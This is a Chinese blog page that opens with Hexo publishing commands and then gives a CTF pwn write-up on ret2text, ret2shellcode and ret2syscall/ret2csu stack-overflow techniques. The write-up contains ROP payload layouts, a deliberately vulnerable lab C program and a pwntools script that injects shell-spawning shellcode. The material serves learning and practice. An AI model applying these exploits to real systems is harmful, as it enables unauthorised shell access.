<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br><span class="line">hexo d -g #生成部署</span><br><span class="line">hexo s -g #生成预览</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure>

<p>复制</p>
<ul>
<li>发布文章</li>
</ul>
<p>终端<code>cd</code>到<code>blog</code>文件夹下，执行如下命令新建文章：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo <span class="keyword">new</span> <span class="string">&quot;xxx&quot;</span></span><br></pre></td></tr></table></figure>

<p>复制</p>
<p>名为<code>xxx.md</code>的文件会建在目录<code>.../blog/source/_posts</code>下。</p>
<p>所有的文章都会以<code>md</code>形式保存在<code>_post</code>文件夹中，只要在<code>_post</code>文件夹中新建<code>md</code>类型的文档，就能在执行<code>hexo g</code>的时候被渲染。新建的文章头需要添加一些信息，如下所示：（注意空格）</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line"><span class="attr">title</span>: xxx    <span class="comment">//在此处添加你的标题。</span></span><br><span class="line"><span class="attr">date</span>: <span class="number">2016</span>-<span class="number">10</span>-<span class="number">07</span> <span class="number">13</span>:<span class="number">38</span>:<span class="number">49</span>   <span class="comment">//在此处输入编辑这篇文章的时间。</span></span><br><span class="line"><span class="attr">tags</span>: xxx    <span class="comment">//在此处输入这篇文章的标签。</span></span><br><span class="line"><span class="attr">categories</span>: xxx    <span class="comment">//在此处输入这篇文章的分类。</span></span><br><span class="line">---</span><br></pre></td></tr></table></figure>

<p>复制</p>
<p>文章编辑完成后，终端<code>cd</code>到<code>blog</code>文件夹下，依次执行如下命令来发布：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>



<p>在使用git命令中器粘贴快捷键为shift+insert</p>
<p><img src="/2024/03/27/hexo/image-20240327212407451.png" alt="image-20240327212407451"></p>
<p>可以通过按鼠标左键的open git bash here召唤命令</p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1520557">这可能是迄今为止最全的hexo博客搭建教程-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<p><img src="/2024/03/27/hexo/image-20240327211652140.png" alt="image-20240327211652140"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hexo/" rel="tag">hexo</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/hexo/">hexo</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-wp" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/03/27/wp/" class="article-date">
  	<time datetime="2024-03-27T12:06:41.000Z" itemprop="datePublished">2024-03-27</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/03/27/wp/">
        pwn 一些题详解
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>#ret2text</p>
<p>主要分为32位的和64位的不同程序，在做法是有不同的对应方法与</p>
<p>在一开始都要先在linux中先确定程序使用了那些保护方式与结构类型</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec 文件名</span><br></pre></td></tr></table></figure>
<p>![屏幕截图 2023-11-28 173641](wp&#x2F;屏幕截图 2023-11-28 173641-17115444455564.png)</p>
<p>![屏幕截图 2023-11-28 173737](wp&#x2F;屏幕截图 2023-11-28 173737.png)</p>
<p><em>1</em>，无论是32位还是64位都要首先确定栈溢出时要填充多少个垃圾数据，有两种方法，ida和动调</p>
<p>ida（在特定的环境下可能不对以动调的为主）：直接看所要溢出的那个栈在ida上与ebp的距离就是我们一开始要填从的数据的大小，注意在ida上显示的是16进制的数，在写脚本是要转化为10进制的数才能正确，如图要向buf中填充0x12（18）的数据才算覆盖到ebp的位置<br>![屏幕截图 2023-11-27 204046][wp&#x2F;屏幕截图 2023-11-27 204046.png]![屏幕截图 2023-11-27 204046](wp&#x2F;屏幕截图 2023-11-27 204046.png)</p>
<p>动调：gdb+可执行文件的名称，在运行到输入数据是输入较亮眼的数据，在之后看esp和ebp的距离，是为要注入的数据长。</p>
<p>现在注入的数据到达ebp所指向的地方但并没用完，由于栈的特点此时我们<br>还需要向其中再注入一段数据用于覆盖ebp所指向的地址，并且这段数据在不同系统中有不同的长度，在64位系统中要输入8个长度的数据，在32位系统中要输如4个长度的数据<br>以上的垃圾数据长度为一个字节（一个大写字母），用如下传递</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*长度的大小</span><br></pre></td></tr></table></figure>

<p>在确定垃圾数据的长度后在注入的数据便是之后程序要跳转执行的地方，在当下的情况下要让程序能执行system(&#x2F;bin&#x2F;sh)以获得控制权，如果在程序中有这个完整的函数，则在垃圾数据之后直接输入该函数的地址跳转到那执行就行，无论是32位还是64位都这样。函数的地址在ida中获得，用如下传递</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p32(<span class="number">0</span>x地址数字）用于<span class="number">32</span>位系统</span><br><span class="line">p64(<span class="number">0</span>x地址数据)用于<span class="number">64</span>位系统</span><br></pre></td></tr></table></figure>

<p><strong>函数传参</strong><br>在很多情况下程序中并不会直接有system(&#x2F;bin&#x2F;sh)这个函数，而是将这system和&#x2F;bin&#x2F;sh放在不同的地方，需要我们将这两个同过地址的连在一起，用于执行，而此处32为系统与64为系统便是完全不同的方式进行，分开论述。</p>
<p><em>32位系统</em>pit<br>在将垃圾数据输入进去之后直接输入到system函所在的地址（切记要输入的是该函数在plt段的地址，不能是text段的地址）<br>此时当程序执行到这里时会直接进入该函数的内部此时我们只要再输入字符串（&#x2F;bin&#x2F;sh）的位置程序便会执行该函数，但在输入字符串之前还要输入一个0</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*垃圾数据的长度+p32(plt段的system的地址)</span><br><span class="line">+p32(<span class="number">0</span>)+p32(.data段的/bin/sh的地址)</span><br></pre></td></tr></table></figure>
<p>关于0的加入：<br>对于本题的函数传参，我们的栈帧构造初步想法如图</p>
<p>ebp	‘aaaa’<br>r	return to func<br>参数一	“&#x2F;bin&#x2F;sh”<br>输入适量垃圾填充 padding * b ‘a’<br>覆盖返回地址指向func函数 p32(ret_addr)<br>参数”&#x2F;bin&#x2F;sh”地址<br>则payload &#x3D;  padding*b’a’ + p32(ret_addr)  + p32(sh_addr)</p>
<p>然而这样的脚本在攻击时会出错。原因在于：</p>
<p>正常的函数调用call来达到push eip；jmp的作用，经过初步payload构造的攻击如下图所示，是通过覆盖return达到jmp的作用的，并没有像call一样push eip到栈中。<br><img src="http://blog.forevers.love/usr/uploads/2023/11/4234700732.png" alt="38e10a9971624ec18cd2d549954ca408.png"><img src="/2024/03/27/wp/38e10a9971624ec18cd2d549954ca408.png" alt="38e10a9971624ec18cd2d549954ca408"><br> 故而ret执行后，ebp后为我们输入的参数而非eip原地址（函数结束后返回的地址），而函数读取参数的位置在上文中已经展示，为 ebp+0x8。故而在利用ret2text覆盖pwn题时候，需要自行加入一行栈帧的填充。<br><img src="http://blog.forevers.love/usr/uploads/2023/11/1648215160.png" alt="701953734d034bbe98efac9dc5c6f836.png"><img src="/2024/03/27/wp/701953734d034bbe98efac9dc5c6f836.png" alt="701953734d034bbe98efac9dc5c6f836"><br><em>64位系统</em><br>在64位的中在将垃圾数据写入之后，我们要将&#x2F;bin&#x2F;sh这段数据先写入到一个寄存器中然后将这个寄存器导入到函数中程序才能·执行<br>于是要做的第一步就是找到一个寄存器并修改其中的值，使用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary 文件名 --only <span class="string">&#x27;pop|ret&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="http://blog.forevers.love/usr/uploads/2023/11/803004082.png" alt="屏幕截图 2023-11-28 195354.png">![屏幕截图 2023-11-28 195354](wp&#x2F;屏幕截图 2023-11-28 195354.png)<br>通过这个我们可以找的程序中可以给我们使用·修改寄存器的命令的地址<br>在这里我们只用传一段函数于是只要用pop rdi；ret一个指令将rdi中的值修改，然后便是在栈中放入‘bin&#x2F;sh’经由pop提交给rdi，最后便是填system的地址（在这里要填入的不能是plt段的system函数的地址，要填的是.data段中的call system的地址，因为在之前将&#x2F;bin&#x2F;sh的地址填入其中从而导入rdi中，如果要rdi中的数据能进入system中则要用call system，将rdi中值导入system然后在执行该函数)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*垃圾数据的长度+p64(pop|ret的地址)+</span><br><span class="line">p64(.data段中的/bin/sh的地址)+p64(.data段中的call system的地址)</span><br></pre></td></tr></table></figure>

<p>#ret2shellcode<br>在这一类题中不会出现system和&#x2F;bin&#x2F;sh这种直接可以用来控制的函数，但程序中有一部分是可读可写可执行的部分，这一部分在程序中是很危险的一部分，一旦出现这种地方，同时含有栈溢出，便可以在通过栈溢出之后使程序跳到那部分可读可写可执行的部分，我们在往里面输入我们shellcode（意为一段恶意程序，通过执行这一段恶意程序，获得控制权）</p>
<p>关于可读可写可执行段的查找可以在gdb调式程序的过程中用vmmap指令查找<br><img src="http://blog.forevers.love/usr/uploads/2023/11/3104877570.png" alt="屏幕截图 2023-11-30 143610.png">![屏幕截图 2023-11-30 143610](wp&#x2F;屏幕截图 2023-11-30 143610.png)<br>如图便可以查找到从0x601000到0x602000是可读可写可执行（一下称为rwx)的程序，我们便可以将shellcode写入到这段程序</p>
<p>有的时候这个程序不一定在一开始写的时候便有rwx段程序，但在执行时会因为那个指令出现rwx段程序，如</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mprotect(<span class="number">0x601000</span>,<span class="number">0x100</span>,PROT_READ | PROT_WRITE | PROT_EXEC);</span><br></pre></td></tr></table></figure>
<p>这个指令将0x601000之后的0x100段数据都改为rwx程序于是我们便可以想这段之中写入我们的shellcode，在通过栈溢出使他执行这一段程序。</p>
<p><strong>shellcode</strong><br>一段恶意程序，可以在pwntools中获得比较简单的一些，执行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shellcraft.sh()<span class="comment">//默认为32位的如果要64位执行下面这个</span></span><br><span class="line">shellcraft.amd64.sh()<span class="comment">//</span></span><br></pre></td></tr></table></figure>
<p><img src="http://blog.forevers.love/usr/uploads/2023/11/2163217567.png" alt="屏幕截图 2023-11-30 145900.png">![屏幕截图 2023-11-30 145900](wp&#x2F;屏幕截图 2023-11-30 145900.png)<br>此时我们获得不过是汇编语言不能直接传入程序中，必须将它换为机器语言传入才能穿入成功</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">asm</span>(shellcraft.sh())</span><br><span class="line">这样输出的便是机器语言的shellcode，直接传入其中便可以使用</span><br></pre></td></tr></table></figure>
<p>在64位的是可能会因为其环境默认为32位的而出现问题可以通过如下修改<br><img src="http://blog.forevers.love/usr/uploads/2023/11/3832015840.png" alt="屏幕截图 2023-11-30 150708.png">![屏幕截图 2023-11-30 150708](wp&#x2F;屏幕截图 2023-11-30 150708.png)</p>
<p><strong>例题</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE   </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//gcc poc.c -o poc -no-pie -fno-stack-protector</span></span><br><span class="line"><span class="type">char</span> shellcode[<span class="number">100</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">initt</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">		setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">		<span class="keyword">return</span> setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pwnn</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">char</span> a[<span class="number">10</span>];</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;please pwn me!!!&quot;</span>);</span><br><span class="line">		read(<span class="number">0</span>,a,<span class="number">0x20</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">InputName</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;inputs you name&quot;</span>);</span><br><span class="line">		read(<span class="number">0</span>,shellcode,<span class="number">100</span>);</span><br><span class="line">		mprotect(<span class="number">0x601000</span>,<span class="number">0x100</span>,PROT_READ | PROT_WRITE | PROT_EXEC);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	initt();</span><br><span class="line">	InputName();</span><br><span class="line">	pwnn();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这段程序中先执行InputName函数，在这个函数中，同构read向shellcode中可以输入最长100字节的数据，然后我们会发现他将0x601000之后100的数据改为rwx段，在ida中正好可以看到shellcode段的数据刚好在这其中，我们便可以通过这个向其中输入shellcode，在pwnn这个函数中正好有栈溢出的存在，<br>于是便可以先通过InputName函数输入shellcode然后再pwnn中栈溢出指向<br>shellcode的地址<br>攻击如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=process(<span class="string">&quot;./poc&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span><span class="comment">//更改环境</span></span><br><span class="line">bss=<span class="number">0x6010A0</span><span class="comment">//shellcode的地址</span></span><br><span class="line">payload=b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*<span class="number">24</span>+p64(bss)<span class="comment">//溢出并指向地址</span></span><br><span class="line">binsh=<span class="keyword">asm</span>(shellcraft.amd64.sh())构建shellcode</span><br><span class="line">io.send(binsh)<span class="comment">//先将shellcode传入rwx段中</span></span><br><span class="line">io.recv()<span class="comment">//由于是两段输入中间一个做间隔</span></span><br><span class="line">io.send(payload)<span class="comment">//进行栈溢出</span></span><br><span class="line">io.interactive()<span class="comment">//交互</span></span><br></pre></td></tr></table></figure>
<p>在这一类题中有一个必须注意的事，shellcraft注入的地方最好是bss区，在这题中便是注入到bss区中的，虽然可以注入到栈上但栈上的保护过多最好不要注入到栈中</p>
<p>#ret2syscall<br>来吧趁今天有点时间把欠了一个星期的博客给补了<br>syscall相当于是一个系统中的命令，可以在与其他寄存器相配合的情况下完成系统调令，在程序没有system和&#x2F;bin&#x2F;sh时使用。<br>在系统中要取得控制权常用的方法是执行system（&#x2F;bin&#x2F;sh）指令，但很多情况下程序是一般不会有这个指令的，此时便可以看是不是可以通过向rwx段注入shellcode来获得控制权，但程序一般也不会有这种地方此时便可以开始考虑ret2syscall的方法，但这种方法夜有很大的局限性，一般只能在静态链接中使用，很少在动态链接中使用，虽然也不是不可以（之后便会讲一题用动态链接的题虽然在一定程度上那题可以算ret2csu的题但本质上还算用syscall可以做的题），</p>
<p>ret2syscall的本质就是让部分寄存器中的值变为特殊值从而使程序执行一个系统调令</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov eax rax, <span class="number">0xb</span> <span class="number">0x3b</span></span><br><span class="line">mov ebx rdi, [“/bin/sh”] </span><br><span class="line">mov ecx rsi, <span class="number">0</span></span><br><span class="line">mov edx rdx, <span class="number">0</span></span><br><span class="line"><span class="type">int</span> <span class="number">0x80</span> syscall</span><br><span class="line">=&gt; execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>

<p>在静态链接中，在系统内核中的execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)这个函数可以获得控制权，但由于他是内核函数，所以，在调用它时必须满足一些必要的调用约定才可以进行调用，</p>
<p>像这些系统内核函数调用必须使用一些特殊的汇编指令才能调用，如int 80（32位）和syscall（64位）就像一个call函数，但是是跳转到内核系统中，至于要跳到哪个函数则要根据之前部分寄存器的值来确定，eax(32)和rax(64)保存了系统调用号（内核函数在内核中都有独属于自己一个调用号，如execve的调用号为11（32位&#x3D;0xb）,59（64位&#x3D;0x3b））,ebx和rdi用来保存在函数中执行的参数的地址，同时要保证ecx，edx和rsi，rdx中的值都为0。</p>
<p>大致就是这个但现在我们要面临的问题是如何修改寄存器中的值，这个有一个很好的方法。可以在终端中运行rop便可以找到程序中的可以帮我们修改寄存器的指令</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary 文件名 --only <span class="string">&quot;pop|ret&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="http://blog.forevers.love/usr/uploads/2023/12/1839070299.png" alt="屏幕截图 2023-12-09 160956.png">![屏幕截图 2023-12-09 160956](wp&#x2F;屏幕截图 2023-12-09 160956.png)</p>
<p>如此便可以查看在程序中有那些可以供我们去修改寄存器的命令（像这种用于修改寄存器的指令一般被称为gadget），我们只要在栈溢出的垃圾值后面加入这些指令，pop+寄存器的意思是将此时栈上的值取出放入寄存器中，ret的作用是返回栈中，回到我们自己的指令去继续执行我们的指令，而要放入寄存器中的值则只要放在这个指令地址的后面，在程序执行时会将这个指令的后面的那个值作为出栈的数据放入寄存器中。需要注意的是在命令中可能不止一个寄存器，此时我们变要将每一个寄存器的值都改变，便在寄存器命令后面以此放上要放入寄存器的值，如</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0000000000405b44</span> : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret</span><br><span class="line">这是用上面的那个指令运行后出现的一行数据</span><br><span class="line">我们的利用</span><br><span class="line">p32(<span class="number">0x0000000000405b44</span>)+p32(<span class="number">2</span>)+p32(<span class="number">0</span>)+p32(<span class="number">9</span>)+p32(<span class="number">0x3d</span>)</span><br></pre></td></tr></table></figure>
<p>如此当被我们劫持的程序执行到这里时，便会依次将2，0，9，0x3d这四个数据分别放入rbx,rbp,r12,r13这四个寄存器中，然后ret会将程序返回到原本的指令中。</p>
<p>有了以上的分析其实像这种题的过程便可以很清晰的出来了，<br>32位程序：<br>先输入垃圾数据然后，寻找足够的gadget将eax的值改为0xb，ebx改为‘&#x2F;bin&#x2F;sh’的地址（有的程序中会没有这个数据，但可以自己输入，在之后的题便是这种，到时候细讲）ecx改为0，edx改为0。<br>在这4个寄存器的值都改好后便可以执行int 0x80这个指令，获得控制权·<br>64位程序：<br>先输入垃圾数据然后，寻找足够的gadget将rax的值改为0x3b，rbi改为‘&#x2F;bin&#x2F;sh’的地址（有的程序中会没有这个数据，但可以自己输入，在之后的题便是这种，到时候细讲）rsi改为0，rdx改为0。<br>在这4个寄存器的值都改好后便可以执行syscall这个指令，获得控制权·</p>
<p>如上便是ret2syscall这类题的做法，其实细看回事有很大的限制在其中<br>1，要有足够将4个寄存器都修改的gadget，这一点便基本将动态链接给淘汰了，在大部分的动态链接中是没有足够多的gadget给我们使用的，只用静态链接中才会有足够时的gadget<br>2，在程序中必须有int 0x80（32位程序）或syscall（64位程序）指令</p>
<p>现在便拿出一道方法用的是ret2syscall但其中用了ret2csu的思想的一道动态链接的64位程序的（神奇）题</p>
<p>老样子先用checksec查看程序的保护（这道题是学长给的，在一开始题目就是ret2syscall虽然我一度怀疑题目错了，但最后确实没错，在后面为了好输入我改成poc）<br><img src="http://blog.forevers.love/usr/uploads/2023/12/1565444552.png" alt="屏幕截图 2023-12-09 170220.png">![屏幕截图 2023-12-09 170220](wp&#x2F;屏幕截图 2023-12-09 170220.png)<br>没什么特别的那就直接开整吧，</p>
<p>既然是ret2syscall那就找gadget，这里便是我懵逼的第一个地方，如此少的gadget，只能找到修改rdi和rsi的指令器外两个寄存器的值该怎么改？（拿命改），<br><img src="http://blog.forevers.love/usr/uploads/2023/12/3017193538.png" alt="屏幕截图 2023-12-09 171431.png">![屏幕截图 2023-12-09 171431](wp&#x2F;屏幕截图 2023-12-09 171431.png)</p>
<p>先不管将程序放入64位的ida中<br><img src="http://blog.forevers.love/usr/uploads/2023/12/3385520804.png" alt="屏幕截图 2023-12-09 172045.png">![屏幕截图 2023-12-09 172045](wp&#x2F;屏幕截图 2023-12-09 172045.png)<br>果然，一看左边这么少的函数就知道是个动态链接的程序，<br>返回到汇编的窗口仔细一找woc居然有syscall指令<br><img src="http://blog.forevers.love/usr/uploads/2023/12/1100300480.png" alt="屏幕截图 2023-12-09 172639.png">![屏幕截图 2023-12-09 172639](wp&#x2F;屏幕截图 2023-12-09 172639.png)<br>but在参数一栏找发现没有&#x2F;bin&#x2F;sh<br><img src="http://blog.forevers.love/usr/uploads/2023/12/1868602236.png" alt="屏幕截图 2023-12-09 172745.png">![屏幕截图 2023-12-09 172745](wp&#x2F;屏幕截图 2023-12-09 172745.png)<br>这便是我疑惑的第2个地方，后来问了学长才知道，在主程序中有gets函数便可以在劫持程序后利用gets函数将&#x2F;bin&#x2F;sh这个字符串输入到bss段中的空地址中，然后再调用。</p>
<p>好到现在来总结一下，我们能使用的有<br>syscall命令，<br>rdi和rsi寄存器，<br>用gets函数输入&#x2F;bin&#x2F;sh，<br>如果不考虑ret2libc的话，还差rax和rdx寄存器的改变</p>
<p><strong>此时一个重要的思想出来，在程序中的__libc_csu_init函数，能有大用，改变某些寄存器的作用</strong><br>这便是ret2csu的思想，将程序导入__libc_csu_init函数中从而改变一些gadget不能改变的寄存器的值<br><img src="http://blog.forevers.love/usr/uploads/2023/12/4152783716.png" alt="屏幕截图 2023-12-09 192250.png">![屏幕截图 2023-12-09 192250](wp&#x2F;屏幕截图 2023-12-09 192250.png)<br>在这里便可以先让程序执行0x4012DA地址的指令，修改rbx,rbp,r12,r13,r14,r15寄存器的值，然后在使程序执行0x4012C0地址的指令，从而修改rdx,rsi,edi的值（虽然是edi不是rdi，但是也可以相当于改变rdi，一般用不到前面的位数改变后面的足够了）最后的call可以直接跳转到一个函数出执行（这里有一个大坑，后面慢慢讲)</p>
<p>到了此时便只差rax的值不能改变，在程序中慢慢找看看能不能找到可以改变的地方<br><img src="http://blog.forevers.love/usr/uploads/2023/12/1473558961.png" alt="屏幕截图 2023-12-09 194646.png">![屏幕截图 2023-12-09 194646](wp&#x2F;屏幕截图 2023-12-09 194646.png)<br>好，找到了，在0x40119e及后面的指令在利用后刚好能将edi中的值传输到eax中（在64为系统中主用的是r开头的寄存器，e开头寄存器就是r开头的寄存器的后半部分，大部分情况下，r开头的寄存器前半部分的值用不到的，e的改变足够用），在这里还有一个很重要的点，我们是先将edi的值传进[rbp+var_4]，在将[rbp+var_4]传进eax中，于是我们必须要保证[rbp+var_4]中的值是一个空但有限的地址，在bss段中选择。（var_4在前面有定义，但不用管比较小，只要保证rbp中的地址空并且有效就行)</p>
<p>由于本题中需要用到的空地址有点多，先讲一下空地址的选择<br>由于我们在调用gets函数需要向空地址写入数据，便要找到一个可写的地址，而bss段便是一个可写的地方，我们可以通过gdb调试中寻找在gdb调试进入程序后输入</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmmap</span><br></pre></td></tr></table></figure>
<p>命令便可以看到每一段地址对应的能力，然后在确认好地址后用如下命令查看地址对应的存放情况</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/<span class="number">20</span>gx 地址名<span class="comment">//20代表的是从该地址往后的20字节的地址都显示出来</span></span><br></pre></td></tr></table></figure>
<p><img src="http://blog.forevers.love/usr/uploads/2023/12/3926396535.png" alt="屏幕截图 2023-12-09 201100.png">![屏幕截图 2023-12-09 201100](wp&#x2F;屏幕截图 2023-12-09 201100.png)<br>如此便可以确认这个地址是一个可写的空的有效的地址</p>
<p>如此我们便可以将这个题的全部思路写出来，在一开始直接向程序中输入24个垃圾字节数据进行栈溢出，用于劫持程序，然后利用gets函数输入&#x2F;bin&#x2F;sh字符串，<br>在这里会出现一个事情，我们要向一个特定地址输入字符，而gets函数的原型是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">gets</span><span class="params">(<span class="type">char</span> *str)</span>;</span><br></pre></td></tr></table></figure>
<p>于是在执行gets函数中时便会向先调用rdi寄存器（rdi为最常用的通用寄存器）中的值作为函数输入的值的存放地址，<br>于是我们便要向rdi赋一个空地址，然后才调用gets函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*<span class="number">24</span>+p64(pop_rdi_ret)+p64(<span class="number">0x404480</span>)+p64(gets)<span class="comment">//get地址为plt段的地址，0x404480空地址</span></span><br></pre></td></tr></table></figure>
<p>然后程序便等待输入，输入的过程可以在后面重新开一个新的payload2用于输入数据</p>
<p>在输入完成后开始对其他寄存器的值开始改变，先改变rax中的值为0x3b，将rdi中的值改变为0x3b，然后将rbp赋值为一个空地址为是程序执行下去，在程序后面还要在加一个空地址用于解决pop rbp指令</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">0x3b</span>)+p64(pop_rbp_ret)+p64(<span class="number">0x404680</span>)+p64(edi_eax)+p64(<span class="number">0x404580</span>)<span class="comment">//两个地址都是空地址，edi_eax是指令的开始</span></span><br></pre></td></tr></table></figure>

<p>现在rax的值已经改为0x3b，然后将r12,r13,r14,r15改为&#x2F;bin&#x2F;sh的地址，0,0,call要调转的地方。然后再执行mov的指令</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call    ds:(__frame_dummy_init_array_entry - <span class="number">403E10</span>h)[r15+rbx*<span class="number">8</span>]</span><br></pre></td></tr></table></figure>
<p>这里有一个特殊的地方，call的跳转并不会直接跳转到那个指令的地址，然后执行，而是会将[r15+rbx*8]的地址所存放的地址先读取了，跳转到那个地址然后执行，所以在gets函数输入处不只要&#x2F;bin&#x2F;sh还要syscall指令的地址，然后在让call的调转到gets函数输入的syscall指令的地址，</p>
